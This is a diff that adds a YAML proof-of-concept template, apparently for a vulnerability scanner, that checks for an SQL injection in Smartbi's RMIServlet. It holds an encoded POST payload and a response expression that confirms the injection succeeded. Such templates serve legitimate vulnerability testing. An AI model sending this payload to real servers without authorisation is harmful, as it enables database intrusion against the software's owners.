@@ -1,0 +1,20 @@
+id: poc-yaml-smartbi-delusers-sqli
+info:
+  name: Smartbi Delusers SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: Smartbi
+  osprey-id: vb_2019_0084
+requests:
+- method: POST
+  path: /smartbi/vision/RMIServlet
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: encode=Vctw6_R-Wp4gRip+hpSzDp4D+/JV/JV/uuf1n/utAR_A1/NT1/utnf1n/utADpSpik/u71/u7Q6Rw6/u7DpSpik/u7uEEE/utnf1nE/u7/u7(6h/u7iyQDp4Rh/u76wk/u7R6/u7Anf1/uu/JT/JT
+  expression: 'status_code == 200 && contains(body, "H~CxOm~") && !contains(body,
+    "没有权限") && !contains(body,"尚未登录") && !contains(body,"会话已超时")
+
+    '
+variables: {}
+transport: http
